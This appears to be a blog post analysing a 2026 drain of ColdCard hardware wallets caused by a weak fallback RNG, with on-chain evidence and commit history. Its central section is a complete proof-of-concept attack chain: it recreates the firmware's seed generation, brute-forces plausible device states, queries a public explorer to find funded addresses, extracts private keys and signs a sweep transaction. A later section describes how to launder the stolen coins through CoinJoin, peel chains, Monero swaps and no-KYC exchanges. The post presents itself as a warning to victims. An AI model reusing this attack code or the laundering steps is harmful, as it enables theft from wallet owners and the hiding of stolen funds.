---
title: "Exploiting Coinkite's RNG Egregious Problem"
slug: "exploiting-coinkites-rng-egregious-problem"
date: '2026-08-01T09:00:00-03:00'
draft: false
translationKey: explorando-o-problema-escandaloso-do-rng-da-coinkite
description: "How an attacker enumerates the ColdCard's reduced key space, finds vulnerable wallets on the public blockchain, and moves the funds. Real data from the ongoing theft and step-by-step didactic code."
tags:
- bitcoin-and-cryptocurrency
- security
- hardware
---

Yesterday I published the practical warning: [if you keep Bitcoin on a ColdCard, move everything](/en/2026/07/31/urgent-if-you-keep-bitcoin-on-a-coldcard-move-everything/). Today I will show **how** it works from the attacker's side. This is not a tutorial for stealing; it is a didactic explanation of a bug class that few people know from the inside, using real blockchain data and code any programmer can read.

The didactic code in this article was generated with **Kimi K3**. It is worth noting that, given the same prompt, both **Claude** and **GPT** refused to produce the same kind of example — both cited risk of malicious use, even though the goal here is exactly the opposite: to show why the vulnerability works so victims understand the risk and can protect themselves.

The goal is to answer, line by line, a question many people asked: "if the ColdCard stays offline, how did the bitcoins disappear?".

> **Warning:** the code here is educational. Running it against addresses that are not yours is a crime. Use it to understand the risk, test your own seeds in a controlled environment, and reinforce why you need to generate fresh entropy.

## Summary of the previous post

Between March 2021 and the July 2026 fix, several ColdCard firmwares generated seeds from a deterministic generator instead of the hardware TRNG. The blame lies in a botched integration: the macro `MICROPY_HW_ENABLE_RNG` was defined as `0`, but the guard in `libNgU` used `#ifndef`, which only asks whether the symbol exists. The build succeeded, the `rng_get()` call fell through to MicroPython's [Yasmarang](http://www.literatecode.com/yasmarang) software fallback, and the seed became a product of the microcontroller UID and timing registers.

For readers who do not work with hardware, here is what those acronyms mean:

- **UID** (*Unique Identifier*) is the serial number burned into the microcontroller chip at the factory. In the STM32F4 used by the ColdCard, it is 96 bits long — something like `0x4A3F B201 C847 D5E9 1234 5678`. Every chip leaves the assembly line with a different UID, but it is fixed and can be read by software. If the attacker knows (or can constrain) this number, they eliminate one of the unknowns.
- **RTC** (*Real-Time Clock*) is the microcontroller's real-time clock. In a PC, that clock is usually backed by a coin-cell battery and keeps running while the machine is off. **The ColdCard has no such battery.** On Mk2/Mk3 the RTC oscillator is disabled at startup, which strongly suggests that the `RTC->TR` and `RTC->SSR` registers read as zero or a static value every time the device cold-boots. On Mk4/Q/Mk5 an RTC source is configured but marked unused, and MicroPython's RTC initialization remains disabled. In other words, "time" is not a fresh entropy source here — it is another fixed or predictable value that an attacker can profile.
- **SysTick** is another timer, this one inside the ARM core itself, counting at high speed — typically from 0 to `0x00FFFFFF` and rolling over. When the firmware reads this counter at seed-creation time, it captures a value like `0x003D7A12`. Because the RTC likely does not vary across cold boots, SysTick becomes practically the only dynamic element of the initial state. [Block](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) estimates that, by itself, it can shrink the space to ~80,000 possibilities (~16 bits).

Block's [independent analysis](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) and Coinkite's [technical backgrounder](https://blog.coinkite.com/entropy-technical-backgrounder/) agree on the mechanism, although they differ on impact details. Yesterday's post has the full affected-firmware table.

The central point is: **the effective entropy dropped from at least 128 bits to roughly 40 bits on the Mk3 and 72 bits (with caveats) on newer models.** Forty bits are not secure. They are enumerable with cheap hardware.

## The wallet does not sit "inside" the ColdCard

Before diving into the attack, repeat the basics. Bitcoin does not sit inside the device. The public blockchain contains UTXOs — transaction outputs — locked by scripts. What your wallet stores is the material to produce signatures that satisfy those scripts.

In the most common case, a native SegWit address is derived from a public key, which in turn comes from a private key, which is just an integer inside the domain of the `secp256k1` curve. Whoever knows the integer can sign. Whoever does not, cannot.

That is why the ColdCard can be powered off, battery-less, inside a safe. The attacker does not need to touch it. They only need to reproduce the same integer that the device drew. With a weak RNG, that stops being impossible and becomes a small search space.

You can see any wallet on the blockchain. Just paste an address or xpub into an explorer like [mempool.space](https://mempool.space). The explorer shows balance, UTXOs, and history because that data is public by design. The ColdCard, Ledger, Sparrow, Electrum — none of them "hold" your bitcoins; they only keep the keys that let you spend the UTXOs in the global ledger.

## How the attacker prioritizes models

Not all models are equally easy to attack. The priority order follows the search-space size:

| Model / firmware | What the attacker must guess | Approximate space | Priority |
|---|---|---|---|
| Mk2/Mk3 v4.0.0–v4.1.9 | Chip UID, timer state, RNG call history | ~40 bits in Coinkite's model; deterministic if everything is known | **1st — attack first** |
| Mk4/Q/Mk5 without successful reseed | Same fallback as above, with possible silent secure-element failure | ~41 bits | **2nd** |
| Mk4/Q/Mk5 with normal reseed | Fallback state + 32 bits from secure element | ~72 bits raw, of which 32 bits are real added secret | **3rd — more expensive** |
| Mk1; Mk2/Mk3 up to v3.2.2 | Hardware TRNG working | ~256 bits | unreachable |

Why is the Mk3 the easiest? Because it has no cryptographic contribution from a secure element. The Yasmarang fallback is fully deterministic given the UID and timer state. If the attacker knows (or can constrain) those values, there is no residual secret. Coinkite estimates the effective space at about 40 bits; [Block](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) shows that, because Mk2/Mk3 RTC values likely start at zero or a static value on cold boot, SysTick alone limits the space to ~80,000 values, i.e. ~16 bits.

On Mk4/Q/Mk5 the secure-element reseed adds 32 bits. That is enough to make the attack much more expensive — but still far from the acceptable 128-bit minimum. Block also points out a source path where a caught exception during initialization can prevent the reseed, falling back to the smaller space.

A rational attacker starts with the biggest return: Mk2/Mk3 v4. Only with leftover resources do they move to Mk4/Q/Mk5.

## 128 bits, 40 bits, and 72 bits: what is the difference?

Bits measure the size of the search space. Each extra bit doubles the work. The difference is not small — it is exponential.

Imagine you can test **1 billion candidates per second**:

| Bits | Candidates | Time to search exhaustively |
|---|---|---|
| 40 | ~1.1 trillion | ~18 minutes |
| 72 | ~4.7 sextillion | ~150,000 years |
| 128 | ~3.4 × 10³⁸ | ~10²² years (many orders of magnitude beyond the age of the universe) |

Another way to picture it: 40 bits is like finding a specific leaf in a small forest. 72 bits is like finding a specific grain of sand on all the beaches on Earth. 128 bits is like finding a specific atom among the atoms of thousands of planets.

That is why 40 bits is not "slightly less secure" than 128. It is a completely different category: practical to attack with common hardware. 72 bits already demands serious resources, but still falls short of the acceptable minimum for storing value. 128 bits is the standard because, with known computing power, it cannot be beaten.

## From an integer to a wallet

Below is a real example of how a number (the entropy) becomes a seed, a private key, and an address. I used 16 bytes (128 bits) just to fit on one line; the ColdCard used 32 bytes, but the idea is the same.

```python
from embit.bip39 import mnemonic_from_bytes, mnemonic_to_seed
from embit.bip32 import HDKey
from embit.script import p2wpkh

entropy = bytes.fromhex("0123456789abcdef0123456789abcdef")  # 128 bits
mnemonic = mnemonic_from_bytes(entropy)
seed = mnemonic_to_seed(mnemonic)
root = HDKey.from_seed(seed)
key = root.derive("m/84'/0'/0'/0/0")
```

Output:

```text
entropy (128 bits): 0123456789abcdef0123456789abcdef
mnemonic (12 words): abuse boss fly battle rubber wasp afraid hamster guide essence vibrant tattoo
seed (64 bytes): a3a99acc7fe076cdc923d0ae79ee735671d8d70a79de19593cca8638f3194251...
root xprv: xprv9s21ZrQH143K25JhKqEwvJW7QAiVvkmi4WRenBZanA6kxHKtKAQQKwZG65kC...
private key (integer): 1332683685242456724974769347593961509584253593377187298409830148921683854281
address: bc1qxjayuwxqj04waw2j4xp5mlhjl47dzdl9mcjmnw
```

The private key is just an integer. From it, the [elliptic curve](/2019/11/26/akitando-68-entendendo-conceitos-basicos-de-criptografia-parte-2-2/) computes the public key; the public key is hashed into the address. The address is what appears on the blockchain; the integer is what lets you spend.

In the ColdCard case, the integer did not have 128 bits of real randomness. It had ~40. So instead of searching for a needle in the universe, the attacker was searching for a needle in a small forest.

## Real evidence on the blockchain

I am not making up numbers. The independent site [coldcard-watch.vercel.app](https://coldcard-watch.vercel.app/) has been tracking the drains transaction by transaction and publishes the verified minimum: **1,128.6633 BTC** drained from **2,334 confirmed addresses**. The site itself stresses that these are **verified minimums, not totals** — other clusters likely exist.

It identifies two draining episodes:

- **July 30, 2026**, blocks **960183 to 960191** — 1,195 addresses drained.
- **July 31, 2026**, blocks **960345 to 960369** — 1,126 addresses drained.

The main public clusters making up that minimum include:

- [`bc1qnk4zh9qcnap2mycp56qjrgza3cc8ylrh8fecp0`](https://mempool.space/address/bc1qnk4zh9qcnap2mycp56qjrgza3cc8ylrh8fecp0) — [received 594.47723261 BTC](https://mempool.space/address/bc1qnk4zh9qcnap2mycp56qjrgza3cc8ylrh8fecp0) in 501 outputs.
- [`bc1qx76cae2706qd5q576feh7xq8rfcsjpf2htfhe3`](https://mempool.space/address/bc1qx76cae2706qd5q576feh7xq8rfcsjpf2htfhe3) — [received ~398.476 BTC](https://mempool.space/tx/14edd9ee8445793c320e92e3b50365a0e18b8b25f424044bce337463f007fdd2) in a single transaction with 491 inputs ([`14edd9ee...`](https://mempool.space/tx/14edd9ee8445793c320e92e3b50365a0e18b8b25f424044bce337463f007fdd2)).
- [`bc1q8jy96fe5lf8vfugydnte3cguk92gpev7kwtp3q`](https://mempool.space/address/bc1q8jy96fe5lf8vfugydnte3cguk92gpev7kwtp3q) — [received ~89.623 BTC](https://mempool.space/tx/4b50d61a3d6e54c62ee0be13d7e9a8b69bffe7fc2b2cab4e14da56e4e20440d2) in a single transaction with 204 inputs ([`4b50d61a...`](https://mempool.space/tx/4b50d61a3d6e54c62ee0be13d7e9a8b69bffe7fc2b2cab4e14da56e4e20440d2)).

Just these three clusters already sum to ~1,082 BTC; the remaining verified transactions bring the confirmed minimum to **1,128.6633 BTC**.

> The first cluster moved ~562 BTC to [`bc1qq85v2c926eg6pgxhwp6q7lf6cnsz80qs3fcu9r`](https://mempool.space/address/bc1qq85v2c926eg6pgxhwp6q7lf6cnsz80qs3fcu9r); that is the same money, not a fourth victim.

A concrete example: transaction [`78ac8968ccf5a586d2fb9509f5af13f41e0a288bfa0f0b177d4e4b6bbebad05d`](https://mempool.space/tx/78ac8968ccf5a586d2fb9509f5af13f41e0a288bfa0f0b177d4e4b6bbebad05d) consolidates three inputs from the same vulnerable address [`bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr`](https://mempool.space/address/bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr), one of them almost **29.9 BTC**. All three inputs use the same compressed public key:

```
037dc5356b71d0209d5d97315450166c07e7bba67d2e53c0154f5c56eb06f6970e
```

So three different UTXOs, same owner, same private key. The attacker found that key and signed all of them at once.

Other source addresses with large values include [`bc1qvshd3nv6mjjs5wtk6x5ekppakdp2trqcsdvwlf`](https://mempool.space/address/bc1qvshd3nv6mjjs5wtk6x5ekppakdp2trqcsdvwlf) (~24.08 BTC), [`bc1q30363smzw6uk5n2znj65mf9432s0e3d92e3fu5`](https://mempool.space/address/bc1q30363smzw6uk5n2znj65mf9432s0e3d92e3fu5) (~14.43 BTC), and [`bc1qgzxfgqgvnle9p6kksk35t54ycu2tx2hwau5ppw`](https://mempool.space/address/bc1qgzxfgqgvnle9p6kksk35t54ycu2tx2hwau5ppw) (~11.74 BTC). You can click each one and watch the UTXOs move to a consolidation address.

Bitcoin Optech [issue 416](https://bitcoinops.org/en/newsletters/2026/07/31/#wallets-generated-by-coldcard-at-risk-of-theft) estimated losses above 1,000 BTC while the case was still unfolding; the independent tracker now confirms **at least 1,128.6633 BTC stolen**.

## What the blockchain timeline suggests about attack order

[coldcard-watch](https://coldcard-watch.vercel.app/) shows **two distinct episodes**, separated by more than 24 hours. The first happened between blocks 960183 and 960191 (July 30, around 01:10 UTC); the second between 960345 and 960369 (July 31). Within the first episode, the three large clusters (~594, ~398, and ~89 BTC) were mined in consecutive blocks — so within each wave, the sweeps were launched almost simultaneously.

This two-wave pattern fits two interpretations:

1. **Same attacker, pre-computed in batches.** The first wave grabs the easiest, best-funded targets; the second wave comes from a second batch of already pre-computed candidates.
2. **Multiple attackers.** After the flaw became public, other actors joined with their own dictionaries of likely states.

Either way, the economics of the attack favor the order in the table above. Mk2/Mk3 v4 is the best return on compute:

- **~40 bits of effective entropy** ≈ 2^40 ≈ **1.1 trillion** candidate states.
- On a GPU testing 1 million candidates per second (including BIP32 derivation and explorer lookup), that would take about **13 days** to search exhaustively. With 100 GPUs/FPGAs, it drops to **a few hours**.
- Because Mk2/Mk3 RTC values likely start at zero or a static value on cold boot, as [Block](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) points out, SysTick alone shrinks the space to ~80,000 values (~16 bits), making the search trivial in seconds.

Mk4/Q/Mk5 with reseed depends on how well the fallback is known:

- If the fallback is known, only the **32 bits** from the secure element remain: 2^32 ≈ **4.3 billion** candidates per device, or about **1.2 hours** per device at 1 million/s.
- If the fallback is completely unknown, the space rises to ~2^72, about **4.7 sextillion** candidates — infeasible by brute force alone.

That is why the first wave should be dominated by Mk3. The second wave, more than a day later, may include additional batches of the same model or harder models where the attacker managed to profile the fallback. Without identifying the model behind each address, we cannot say for sure, but the difficulty order is clear.

The speed also shows the attack did not start from scratch on July 30. To search 1.1 trillion states and find hundreds of funded addresses, the attacker already had infrastructure ready or spent days or weeks pre-computing before moving the first UTXOs.

## What the chain reveals about the operation

[coldcard-hack.up.railway.app](https://coldcard-hack.up.railway.app/) analyzes in detail the three waves that emptied 1,082.59 BTC in **41 minutes** (blocks 960183 to 960191). Although the site warns it was compiled by an AI agent and not human-reviewed, the blockchain data is verifiable:

| Wave | Block(s) | BTC | Addresses | Note |
|---|---|---|---|---|
| 1 | 960183 | ~89.62 | 204 | Took everything, including dust below the fee value. |
| 2 | 960185 | ~398.49 | 491 | Densest burst; left balances below ~0.108 BTC. |
| 3 | 960188–960191 | ~594.48 | 500 | The wave the press reported; started 3.5 minutes after wave 2. |

Notable details:

- **Sorted by balance:** within each wave, transactions were ordered from largest to smallest balance. That is not an accident; it is a priority queue configured in the script.
- **Identical shape:** all 1,195 sweeps spend every UTXO from a single source address into a single output, with no change. No manual variation.
- **Uniform fee rate:** median of 30.136986 sat/vB across all waves — the same script choosing the fee.
- **Address types:** 1,182 were native SegWit (`v0_p2wpkh`), 7 P2SH-wrapped, and 6 legacy. So the attack was not limited to BIP84, although most ColdCard users hold bech32.
- **Funds still sitting:** when the site froze its data, the ~1,082 BTC were still in the vaults, with no mixing, no peel chain, and no subsequent movement.

All of this points to a single automated operation, not 1,195 independent thefts.

## How this slipped through

The same [coldcard-hack.up.railway.app](https://coldcard-hack.up.railway.app/) maps the commits that introduced the bug. The most damning facts:

- The commit that added the wrong `#ifndef` guard in `libngu` had a **one-character message**, changed 28 files, and **did not go through a pull request**.
- The `First pass w/ libNgU` commit, which migrated seed generation to libngu and stripped GPL code, changed **120 files** and was also pushed directly, with no PR.
- The two later commits that added the 32-bit reseed and the secure-element mixing did open pull requests, but **merged with zero reviews**.

A critical change in the entropy-generation path went through without end-to-end review. The correct TRNG existed in the binary; the problem was that the wrong symbol got linked, and nobody wrote a test proving where the seed actually came from.

## The conceptual attack flow

Before the code, the general flow:

1. **Reproduce the RNG.** The attacker implements Yasmarang exactly as in the firmware, including the XOR with the second Yasmarang in `libNgU`.
2. **Enumerate plausible states.** For every combination of UID, SysTick, RTC, and — on newer models — secure-element reseed, they generate the 32 bytes that the ColdCard would have produced as entropy.
3. **Derive the wallet.** From that entropy, compute the BIP39 mnemonic, the BIP32 seed, and the first receiving and change addresses.
4. **Query the blockchain.** For each derived address, ask an explorer or a local node whether a UTXO exists.
5. **Stop at the match.** When a derived address matches an address with balance, the attacker already has the corresponding private key.
6. **Spend.** With the private key, build a transaction that moves the UTXO to an address they control.

The blockchain is the oracle. Without it, the attacker would not know which state produced real money. With it, every UTXO found confirms they guessed the key.

## Proof-of-concept code

The script below is didactic. It is not GPU-optimized, does not run in seconds against 40 bits, and does not handle every firmware variation. What it does is make the attack readable, function by function.

### 1. The broken PRNG: Yasmarang

```python
def yasmarang_step(state):
    """state = [pad, n, d, dat]; mutates the list and returns a uint32."""
    pad, n, d, dat = state

    pad = (pad + dat + d * n) & 0xFFFFFFFF
    pad = ((pad << 3) | (pad >> 29)) & 0xFFFFFFFF
    n = pad | 2
    d = (d ^ ((pad << 31) | (pad >> 1))) & 0xFFFFFFFF
    dat = (dat ^ (pad & 0xFF) ^ ((d >> 8) & 0xFF) ^ 1) & 0xFF

    out = (pad
           ^ ((d << 5) & 0xFFFFFFFF)
           ^ (pad >> 18)
           ^ ((dat << 1) & 0xFFFFFFFF)) & 0xFFFFFFFF

    state[:] = [pad, n, d, dat]
    return out
```

**What it does:** implements the deterministic generator that was in the firmware. It is the same function anyone can copy from the [MicroPython source](https://raw.githubusercontent.com/micropython/micropython/master/ports/stm32/rng.c).

**State example:**

```python
>>> s = [0x0A8CE26F, 69, 233, 0]
>>> [hex(yasmarang_step(s)) for _ in range(3)]
['0x12f99f10', '0x1e0841df', '0x8f794c6c']
```

### 2. From RNG state to ColdCard entropy

```python
def coldcard_entropy(uid_low32, systick, rtc_tr, rtc_ssr, reseed=None):
    """
    Simulates what the ColdCard did to generate the 32 entropy bytes.

    - MicroPython initializes its Yasmarang with:
        pad = UID_low32 ^ SysTick->VAL
        n   = RTC->TR
        d   = RTC->SSR
    - libNgU keeps a second Yasmarang with public constants.
    - Each 32-bit word is: chip ^ my_yasmarang().
    - On Mk4/Q/Mk5, reseed changes the libNgU 'pad' state.
    """
    mpy_state = [uid_low32 ^ systick, rtc_tr, rtc_ssr, 0]
    libngu_state = [0x0A8CE26F, 69, 233, 0]

    if reseed is not None:
        # reseed() in the firmware only overwrites yasmarang_pad
        libngu_state[0] = reseed & 0xFFFFFFFF

    # The ColdCard may make extra calls before generating the seed (health
    # check, etc.). In practice the attacker models the exact call history.
    # Here we simplify to 8 words = 32 bytes.
    words = []
    for _ in range(8):
        chip = yasmarang_step(mpy_state)
        mix = chip ^ yasmarang_step(libngu_state)
        words.append(struct.pack("<I", mix))

    return b"".join(words)
```

**What it does:** builds the initial state. The MicroPython `pad` is `UID_low32 ^ SysTick`; `n` and `d` come from the RTC. `libNgU` enters with public constants. Each word is the XOR of the two. That XOR does not create randomness: if both sides are reproducible, so is the result.

**Example:**

```text
>>> coldcard_entropy(0xDEADBEEF, 12345, 0x123456, 78).hex()
'3013f52faaef2a65c47fee63c83e9773d505bd05e4b2b43f56bb8c60ecc66f66'
```

### 3. From entropy to a Bitcoin address

```python
def first_addresses(entropy_bytes, account=0):
    """
    Given the raw entropy, generate the BIP39 mnemonic, the BIP32 seed,
    and the first native SegWit receiving and change addresses.
    """
    mnemonic = mnemonic_from_bytes(entropy_bytes)
    seed = mnemonic_to_seed(mnemonic)
    root = HDKey.from_seed(seed)

    addrs = {"mnemonic": mnemonic}
    for change in [0, 1]:
        for idx in range(5):
            path = f"m/84'/0'/{account}'/{change}/{idx}"
            key = root.derive(path)
            addr = p2wpkh(key.key.get_public_key()).address()
            label = "receive" if change == 0 else "change"
            addrs.setdefault(label, []).append(addr)
    return addrs
```

**What it does:** takes the 32 bytes, turns them into 24 BIP39 words, computes the seed, opens the BIP32 tree, and derives the addresses. In practice the attacker tests dozens or hundreds of indexes and also other accounts.

**Example:**

```text
>>> cand = first_addresses(coldcard_entropy(0xDEADBEEF, 12345, 0x123456, 78))
>>> cand["mnemonic"]
'copy panic episode fiction verify cream ball worry glow draft place tray expect teach bleak north reflect wide puzzle boat attract glimpse rural setup'
>>> cand["receive"][0]
'bc1qc3rmdj3ln6n05awxwetg0gz8e2aw0lzyxmaecp'
```

### 4. Query the public blockchain as an oracle

```python
def has_utxo(address):
    """True if the address has any UTXO according to mempool.space."""
    url = f"https://mempool.space/api/address/{address}/utxo"
    try:
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        return len(r.json()) > 0
    except Exception as e:
        print("error querying", address, e)
        return False
```

**What it does:** asks the real question. Without this query, the attacker would not know whether they guessed right. The blockchain is the oracle.

**Non-hit example:**

```text
>>> has_utxo("bc1qc3rmdj3ln6n05awxwetg0gz8e2aw0lzyxmaecp")
False
```

The attacker discards it and moves to the next candidate.

**Hit example** (the real victim address [`bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr`](https://mempool.space/address/bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr), before the sweep):

```json
[
  {
    "txid": "78ac8968ccf5a586d2fb9509f5af13f41e0a288bfa0f0b177d4e4b6bbebad05d",
    "vout": 0,
    "value": 2989251877,
    "status": {"confirmed": true, "block_height": 960188}
  }
]
```

When `has_utxo` returns `True`, the attacker knows the seed they just generated produces that address — and therefore the corresponding private key.

### 5. Enumerate candidates and hunt

```python
def brute_mk3(uid_low32):
    """
    Example for Mk3/Mk2 v4: scan plausible SysTick and RTC values.
    In practice the attacker uses GPUs/FPGAs and constrains the UID from
    the device serial.
    """
    for systick in range(80_000):
        for rtc_tr in range(0x000000, 0x240000, 0x100):
            for rtc_ssr in range(0, 256):
                yield coldcard_entropy(uid_low32, systick, rtc_tr, rtc_ssr)


def brute_mk4(uid_low32, systick, rtc_tr, rtc_ssr):
    """
    Example for Mk4/Q/Mk5: the fallback is fixed and the attacker enumerates
    the 2^32 possible secure-element reseed values.
    """
    for reseed in range(0x100000000):
        yield coldcard_entropy(uid_low32, systick, rtc_tr, rtc_ssr, reseed)


def hunt(uid_low32, generator):
    for entropy in generator:
        candidate = first_addresses(entropy)
        for addr in candidate["receive"] + candidate["change"]:
            if has_utxo(addr):
                print("HIT!")
                print("  mnemonic:", candidate["mnemonic"])
                print("  address :", addr)
                return candidate


# Didactic example: use a known UID and a reduced Mk3 generator.
# hunt(0xAABBCCDD, brute_mk3(0xAABBCCDD))
```

**What they do:** `brute_mk3` scans plausible states for Mk3; `brute_mk4` scans the 2^32 secure-element reseeds; `hunt` is the generate-derive-check loop. The real attacker does not run Python; they write this in C/CUDA/FPGA and parallelize by UID. But the logic is identical.

## After finding the collision

When `hunt` returns, the attacker already has the `mnemonic` and the funded address. From there, they get the private key:

```python
from embit.bip39 import mnemonic_to_seed
from embit.bip32 import HDKey

seed = mnemonic_to_seed(candidate_mnemonic)
root = HDKey.from_seed(seed)
addr_key = root.derive("m/84'/0'/0'/0/0")

print("Compressed WIF:", addr_key.key.wif())
print("Address       :", addr_key.address())
```

Typical output:

```text
Compressed WIF: L1P8P5vQUoRiNXpDuezfTf3GJtsFBWyJZsvfVs2gxNtxaAXSNhhF
Address       : bc1qc3rmdj3ln6n05awxwetg0gz8e2aw0lzyxmaecp
```

That WIF is the private key in a format any wallet understands. From here the attacker can:

1. **Import the seed or the WIF** into Sparrow, Electrum, or another wallet.
2. **Rescan** the blockchain to see all UTXOs for that seed.
3. **Build a transaction** sending the funds to an address they control.
4. **Sign and broadcast**.

### Concrete sweep example

In the real case, the attacker swept the 29.89251877 BTC UTXO from address [`bc1qe85jr...`](https://mempool.space/address/bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr) to the consolidation address. What they needed to produce was a signed transaction. The skeleton, with didactic values and a fictional input, looks like this:

```python
from bitcoinlib.transactions import Transaction
from bitcoinlib.keys import HDKey

# key recovered from the collided seed
key = HDKey.from_seed(candidate_mnemonic).derive("m/84'/0'/0'/0/0")

input_value  = 2_989_251_877      # 29.89251877 BTC, in satoshis
fee          = 7_380              # fee in satoshis
output_value = input_value - fee  # what is left for the attacker

tx = Transaction(network='bitcoin', fee=fee, witness_type='segwit')
tx.add_input(
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',  # victim UTXO txid
    0,
    keys=key,
    value=input_value,
    locking_script=bytes.fromhex('0014') + key.hash160,
    script_type='sig_pubkey',
    address=key.address()
)
tx.add_output(output_value, 'bc1qqdcszapk2yjrw0esf4t0etnlpjs5krsk5e99ru')  # attacker address
tx.sign()

print(tx.raw_hex())
```

A valid signed transaction looks like this (hex truncated):

```text
01000000000101aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0000000000ffffffff...
```

The attacker broadcasts that hex to any Bitcoin node (mempool.space, their own node, Electrum, etc.). The protocol does not ask where the key came from; it only checks whether the signature satisfies the script. If the signature is valid, the network includes the transaction in the next block and the UTXO changes owner.

In the real attack, this was done 1,195 times in 41 minutes, all with the same script, the same fee rate, and the same balance-sorted logic.

## What this bug class means

This is not an attack on the elliptic curve, SHA-256, BIP39, or Bitcoin. It is an attack on **entropy**. The manufacturer reduced the key space, and the protocol simply accepted the signatures that came out of that smaller space.

Three lessons:

1. **Do not trust the appearance of randomness.** Yasmarang's output passes simple statistical tests and looks random. But if the initial state is predictable, the entire sequence is predictable.
2. **Hashing does not create entropy.** Passing 40 bits of input through SHA-256 twice yields a nice, uniform hash, but there are still at most `2^40` possible hashes. The attacker enumerates inputs, not hashes.
3. **The blockchain is public and permanent.** A vulnerable wallet can sit quietly for years until someone connects the dots. On the day the attack is published, every UTXO in that key space becomes a target.

## Can the attacker be caught?

Whenever a cryptocurrency theft reaches this scale, one question keeps coming up: "can the person be traced?". The short answer is: **maybe, but it is not trivial**, and tracing is not the same as recovering the bitcoins.

Clay Garrett, who is among the people investigating the case, published [a thread on X](https://x.com/clay_garrett/status/2083247006139503065) claiming that his team identified an unusual sweep pattern. According to the thread, the attack operator allegedly used a paid account at a well-known blockchain-services provider to query the source addresses and related activity during the sweeps. The provider's logs allegedly matched, with "extraordinary specificity," the number, timing, and sequence of requests. The provider, Garrett says, was only delivering normal services; the requests themselves did not reveal their purpose.

What this means, **if confirmed**:

- A blockchain-services provider usually requires an account, and often payment. That can leave traces: email, payment method, IP address, access times, API usage patterns.
- If the account was KYC'd, the chance of identifying a person rises sharply. If payment was made with cryptocurrency, an anonymous voucher, or a third-party card, the link weakens.
- Even with an IP or email, the operator may have used a VPN, Tor, disposable cloud compute, or a stolen identity. Each extra layer reduces the chance of reaching the real person.
- The funds, as far as is known, have not yet been moved to mixers or exchanges. While they remain stationary, there is a window for freezing or judicial recovery. Once they are swapped, mixed, or converted to offshore fiat, asset recovery becomes drastically harder.

So the thread points to a promising line of investigation, but **it is an ongoing allegation**, not a concluded proof. Catching the operator depends on how much they exposed through third-party services, the quality of the logs, jurisdiction, and how fast authorities act. Recovering the bitcoins depends on where the coins are when that happens. The two are related, but they are not the same thing.

## What the attacker has not done yet

So far, the operation has been technically competent at the attack but amateurish at the escape. The ~1,128 BTC stolen are sitting in known consolidation addresses, with no mixer, no coinjoin, no follow-up movement. That is unusual for a theft of this size and worth attention, because it determines what is still recoverable.

### What a mixer is, and why it has not been used

A **mixer** (or **tumbler**) is a service that takes bitcoins from many people, shuffles the amounts inside a single transaction or a series of transactions, and returns equivalent bitcoins to fresh addresses. The goal is to break the public chain of "where it came from."

The classic model is **CoinJoin**: several participants jointly sign a transaction with many inputs and many outputs of the same size. An outside observer sees the money go in but cannot tell which output belongs to whom. Tools like **Wasabi Wallet** and **Samourai Wallet** implement CoinJoin automatically. Samourai even offered a service called **Whirlpool**, where UTXOs go through remix rounds that make tracing even harder.

Another model is the centralized mixer: you send bitcoins to a service address and receive them back from a different pool, minus a fee. Services like **Bitcoin Fog** and **Helix** historically worked this way. The difference from CoinJoin is that you must trust the mixer operator — and several of those operators were arrested precisely because investigators could link deposits to withdrawals.

In the ColdCard theft, none of these techniques has appeared yet. The bitcoins moved from the victims' wallets into three large clusters and have not moved since. That can mean several things:

1. **The attacker is still getting ready.** Stealing 1,128 BTC in 41 minutes is one thing; laundering 1,128 BTC without leaving a trace is another. Setting up an anonymization pipeline takes time, costs money, and requires pre-established accounts.
2. **The attacker did not expect this much visibility.** Once the press and blockchain analysts start tracking addresses in real time, any immediate movement becomes news. Leaving the funds still is a way to wait for the noise to die down.
3. **The attacker may be negotiating a recovery.** Large thefts sometimes end in settlements, with part of the funds returned in exchange for the thief's anonymity.

### How one normally hides a haul like this

If the operator really wants to make tracing difficult, the standard playbook involves several layers:

1. **CoinJoin rounds.** The attacker splits the funds into standardized amounts and runs them through multiple CoinJoin rounds. After a few rounds the graph stops being a tree and becomes a web, making attribution hard.
2. **Peel chain.** Instead of sending everything at once, the operator moves small slices across dozens or hundreds of intermediate addresses, like peeling an onion. Each address forwards most of the value to the next one and a tiny fraction to a final destination.
3. **Instant swaps and bridges.** Swapping Bitcoin for Monero on a decentralized exchange or bridge is a common path: Monero hides sender, recipient, and amount. After a few Monero transactions, the attacker can swap back into Bitcoin at fresh addresses.
4. **Weak-KYC or no-KYC exchanges.** Depositing into exchanges that do not require identification, or that accept third-party accounts, lets the attacker convert into stablecoins, fiat, or other cryptocurrencies. Even with KYC, bought accounts or money mules help create distance.
5. **Offshore fiat.** The final stage is turning the asset into real cash outside jurisdictions that cooperate with investigations. Unregulated exchanges, Bitcoin ATMs, prepaid cards, and accounts in tax havens fit here.

None of these layers makes tracing impossible, but each raises the cost. A well-funded investigation can still follow clues: fees paid by an exchange, timing patterns, change addresses, value matches. The problem is that the more layers there are, the more time it takes — and the more time passes, the lower the chance of freezing the funds before they are spent.

### Why this matters now

The fact that the bitcoins are still in the consolidation addresses means the recovery window is still theoretically open. Law enforcement and private investigators can monitor those addresses, request freezes at exchanges, and pressure blockchain-service providers. If the attacker sends even a single satoshi to a known mixer, alarms go off.

But that window closes as soon as the funds enter an anonymization pipeline. After a proper CoinJoin, a Monero swap, and a network of peel chains, the question stops being "where is the money?" and becomes "who can we arrest?". Recovering the asset becomes technically infeasible for most victims.

In other words, the attacker has already won the first battle — finding and stealing the keys. The second battle, cashing out anonymously, is the one that usually separates big-wallet thieves from thieves who end up in prison.

## Conclusion

If you still have funds in a seed generated by vulnerable ColdCard firmware, the risk is not theoretical. The blockchain already shows hundreds of addresses being emptied by someone who reproduced the broken RNG.

